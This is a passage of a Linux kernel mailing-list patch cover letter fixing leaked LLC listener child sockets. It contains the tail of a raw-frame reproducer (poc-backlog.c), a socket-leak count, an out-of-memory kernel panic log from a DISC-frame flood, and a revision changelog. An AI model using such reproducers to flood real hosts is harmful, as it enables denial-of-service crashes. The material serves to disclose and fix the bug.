		frame[ETH_HLEN + 2] =3D SABME_CMD;
		memset(&sll, 0, sizeof(sll));
		sll.sll_family =3D AF_PACKET;
		sll.sll_ifindex =3D ifindex;
		sll.sll_halen =3D ETH_ALEN;
		memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");
	}
	usleep(200000);
	after_send =3D llc_socket_count();
	/* TCP-style: sk_acceptq_is_full() is >, so listen(N) can hold N+1. */
	expected_max =3D 1 + backlog + 1;
	printf("listen_backlog=3D%d sabme_sent=3D%d llc_sockets_open=3D%d expected=
_max=3D%d\n",
	       backlog, nframes, after_send, expected_max);
	if (after_send < 1 || after_send > expected_max) {
		fprintf(stderr, "FAIL: open socket count %d not in 1..%d\n",
			after_send, expected_max);
		return EXIT_FAILURE;
	}
	close(packet_fd);
	close(listener_fd);
	usleep(200000);
	after_close =3D llc_socket_count();
	printf("llc_sockets_after_close=3D%d\n", after_close);
	if (after_close !=3D 0) {
		fprintf(stderr, "FAIL: leftover sockets after close: %d\n",
			after_close);
		return EXIT_FAILURE;
	}
	printf("backlog_rc=3D0\n");
	return 0;
}
------END poc-backlog.c--------

----BEGIN leak sample----
The original leak-only oracle on the unfixed kernel was a line count of
/proc/net/llc/socket, not a preserved cat of that table. After 100 DISC
frames, and after the listener process had already exited:

  wc -l /proc/net/llc/socket
  before: 0 leftover LLC sockets
  after 100 frames: 100 leftover entries remained

No raw 100-row proc table from that run was kept. The panic_on_oom log
below is from a separate fresh unfixed 6.12.74 guest running the
110000-frame flood; it is not the leak oracle itself.
------END leak sample--------

----BEGIN crash log----
Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabl=
ed

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.=
74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3=
))=20

[1665.707568][T10284] panic (kernel/panic.c:611)=20

[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 =
include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomi=
c-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/v=
mstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473)=
=20

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288)=20

[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1)=
)=20

[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1))=
=20

[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114)=20

[1665.710868][T10284] ? lock_acquire+0x2f/0xb0=20

[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_=
alloc.c:4478 mm/page_alloc.c:4839)=20

[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (dis=
criminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (=
discriminator 1) mm/page_alloc.c:4839 (discriminator 1))=20

[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.712658][T10284] ? hlock_class+0x4e/0x130=20

[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792)=20

[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10=20

[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90=20

[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator=
 1) mm/mempolicy.c:2066 (discriminator 1))=20

[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637)=20

[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227)=
=20

[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.717656][T10284] ? xas_load (lib/xarray.c:243)=20

[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850)=20

[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 i=
nclude/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-=
flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:=
699 mm/mempolicy.c:2356)=20

[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511)=20

[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996)=
=20

[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 incl=
ude/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-fla=
gs.h:562 mm/filemap.c:3241 mm/filemap.c:3342)=20

[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818)=20

[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 m=
m/filemap.c:3342)=20

[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315)=20

[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0=20

[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10=20

[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)=20

[1665.722813][T10284] __do_fault (mm/memory.c:4887)=20

[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)=20

[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0=20

[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:1=
82)=20

[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0=20

[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discrim=
inator 2) mm/memory.c:6266 (discriminator 2))=20

[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 =
mm/memory.c:5789 mm/memory.c:5932)=20

[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10=20

[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604)=20

[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841)=20

[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:156=
2)=20

[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256)=20

[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943)=20

[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/=
mm/fault.c:1230)=20

[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 ar=
ch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/faul=
t.c:1534)=20

[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:6=
23)=20

[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb

[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a=
1.

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206

[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 000=
0559e433d10c6

[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 000=
0000000000004

[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 000=
0000000000014

[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 000=
0559e433d10c6

[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 000=
0000000000004

[ 1665.734120][T10284]  </TASK>

[ 1665.735174][T10284] Kernel Offset: disabled

[ 1665.735576][T10284] Rebooting in 86400 seconds..
-----END crash log-----

changes in v10:
  - Fix SABME child rollback on direct and backlog state-machine failure.
  - Defer child creation for listener-owned packets until backlog
    admission succeeds, and enforce sk_max_ack_backlog accounting.
  - Release queued child sockets during listener teardown after freeing
    their indication skbs, including bottom-half-safe child locking.
  - Serialize child publication and packet processing with the child
    socket lock and reject stale or out-of-service lookup results.
  - Keep the llc_ui_accept() NULL-dereference concern out of scope as a
    separate issue.
  - v9 Link:
    https://lore.kernel.org/all/cover.1789216793.git.zihanx@nebusec.ai/

changes in v9:
  - Simplify the fix to cover only the non-SABME listener leak:
    create children only for SABME, answer DISC and P=3D1 commands with
    a DM response addressed to the source address decoded from the packet,
    and drop all other non-SABME frames without running the listener state
    machine.
  - Remove the incoming_state / workqueue / child-list lifecycle rewrite.
  - Keep the existing SABME child lifecycle unchanged.
  - Leave accept-queue accounting and llc_ui_accept() unchanged; related
    feedback is outside this non-SABME-only fix.
  - Treat unbounded SABME child allocation as a separate issue; v9 does not
    claim to fix SABME flooding.
  - Explicitly document the disposition of the three earlier review points:
    v9 does not change accept-queue accounting or llc_ui_accept(), and does
    not address unbounded SABME child allocation.
  - v8 Link:
    https://lore.kernel.org/all/abc8b115321dbd417b8491d9e51f1988998ff50e.17=
88707641.git.zihanx@nebusec.ai/
changes in v8:
  - Reject a connection indication whose skb->sk is the listener itself
    so accept() cannot lock_sock_nested() the socket it already holds,
    and drop the extra QUEUED reference only when it was taken.
  - Drop the extra QUEUED hold from the incoming_children close walk,
    matching the receive-queue walk.
  - Do not run the connection state machine on a released incoming child
    from the listener backlog; leftover in-service child frames run on
    that child under its lock.
  - Limit out-of-service tests on the receive path to incoming children
    and to a looked-up child already marked out of service. SAP unhash
    is RCU, so drop that later lookup instead of indexing the state
    table with state 0. This is not a generic llc_conn_service bounds
    check.
  - Do not nested-lock a QUEUED child on itself in llc_backlog_rcv().
  - Sort the new locals in llc_release_incoming_children() reverse
    xmas tree.
  - Describe the original /proc/net/llc/socket leak evidence as the
    wc -l count (0 then 100 leftover entries). No raw proc table from
    that run was kept.
  - Decode the remaining OOM frames against a rebuilt 6.12.74 vmlinux;
    leftover lockdep, sanitizer, and do_pte_missing frames still show
    original offsets.
  - Keep this as the listener child leak and lifecycle fix only. The
    listen(2) accept-queue bound raised against v7 is independent of the
    leak and is not included here.
  - v7 Link:
    https://lore.kernel.org/all/cover.1788414881.git.zihanx@nebusec.ai/
changes in v7:
  - Drop the companion LLC_CONN_OUT_OF_SVC bounds patch due to overlap with
    Kees Cook's net-next series:
    https://lore.kernel.org/all/20260901210300.i.590-kees@kernel.org/
  - That series also covers the connect(2) +1 return and rejecting
    out-of-service states before table lookup, as raised in review of
    v6 2/2:
    https://lore.kernel.org/all/20260902010052.2297527-1-kuba@kernel.org/
  - Keep only the listener child leak fix for net.
  - Fix reverse-xmas-tree local ordering in llc_conn_handler() and
    llc_incoming_sock_work(), align the atomic_cmpxchg() continuation,
    and add matching braces on the backlog retry if/else.
  - Release a PENDING child when llc_conn_handler() sees a redirected
    packet for a TCP_LISTEN socket that is already SOCK_DEAD, instead of
    dropping the packet and leaving that cleanup only to close().
  - Keep the init_net CAP_NET_RAW/CAP_NET_ADMIN reproducer; PF_LLC is
    rejected outside init_net, so unshare -Urn cannot express this path.
  - Spell out that the crash PoC is DISC-only, include poc-sabme.c for
    the accept and close paths, and restore the full OOM panic so the
    leftover /proc/net/llc/socket leak is described next to that log.
  - Do not tear down an already pending child when a redirected frame
    fails sk_add_backlog(); drop that frame only.
  - Track incoming children on the listener and release leftover PENDING
    sockets from that list on close(), instead of relying only on
    sk_receive_queue, backlog drain, or a later SOCK_DEAD packet.
  - Stop taking the listener lock in llc_incoming_sock_work(); the child
    already holds the listener, and teardown no longer interleaves with
    llc_ui_release()'s llc_sk_free().
  - Hold a child socket reference on handshake skbs with
    skb_set_owner_sk_safe(), so kfree_skb() cannot race asynchronous
    teardown through sock_rfree().
  - Finish sock_orphan() and the device put in llc_incoming_sock_work()
    before llc_sk_free(), so those steps do not run after its sock_put().
  - Keep the v1 lore Link on its own line, before the numbered-patch
    diffstat.
  - Include the original leak-only leftover /proc/net/llc/socket count
    next to the later panic_on_oom log.
  - v6 Link:
    https://lore.kernel.org/all/cover.1787752861.git.zihanx@nebusec.ai/
changes in v6:
  - Hold a reference for children queued for accept() and release it when t=
hey
    are dequeued, while retaining SAP publication so tuple lookup still fin=
ds
    a pending child before the passive open completes.
  - Make direct receive, backlog, accept-queue, and listener-close cleanup
    symmetric, with bottom-half-disabled child locking in process context.
  - Keep the LLC_CONN_OUT_OF_SVC lower-bound check in its separate patch and
    use the ADM state boundary consistently.
  - v5 Link:
    https://lore.kernel.org/all/20260822082354.3109-1-zihanx@nebusec.ai/
changes in v5:
  - Make listener child cleanup unconditional so queued children are also
    released if the socket leaves TCP_LISTEN before close.
  - Serialize process-context child cleanup and backlog dispatch with bottom
    halves disabled, avoiding child-lock acquisition races with LLC receive
    and timer paths.
  - Drop packets redirected through a pending child after its listener is no
    longer listening, and release children left out of service instead of
    dispatching them.
  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
  - v4 Link:
    https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
changes in v4:
  - Create a passive-open child only for SABME and generate listener-side DM
    replies directly for non-SABME commands.
  - Use an atomic incoming-child lifecycle and serialize pending-child look=
up,
    backlog processing, rollback, and listener close with the child lock.
  - Keep immediate SAP publication for passive-open tuple matching, but rel=
ease
    unaccepted children on direct and backlog failures and on listener clos=
e.
  - Defer final incoming-child cleanup to workqueue context so timer
    synchronization does not run in the receive softirq path.
  - Add an LLC state lower-bound check before state-table dispatch.
  - v3 Link:
    https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
changes in v3:
  - Drop the unused llc_conn_handler() local rc variable reported in review.
  - Rebase the numbered patch and cover onto commit
    ede76849012e45ffb2193ad110b42027eec02c5c.
  - v2 Link:
    https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
changes in v2:
  - Rework the fix to preserve the existing passive-open tuple matching
    semantics instead of deferring child publication until LLC_CONN_PRIM.
  - Track listener-created children pending publication to accept(), and ro=
ll
    them back on every earlier failure or drop path.
  - Cover the original non-SABME leak and SABME paths which fail before
    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the
    earliest commit that introduced the child publication behavior.
  - Clarify panic_on_oom crash evidence and packetdrill selection.
  - v1 Link:
    https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi=0D
=0D
Zihan Xi (1):
  llc: fix listener child socket leaks

 net/llc/llc_conn.c | 162 +++++++++++++++++++++++++++++++++++++++++----
 1 file changed, 149 insertions(+), 13 deletions(-)

--=20
2.55.0.windows.3

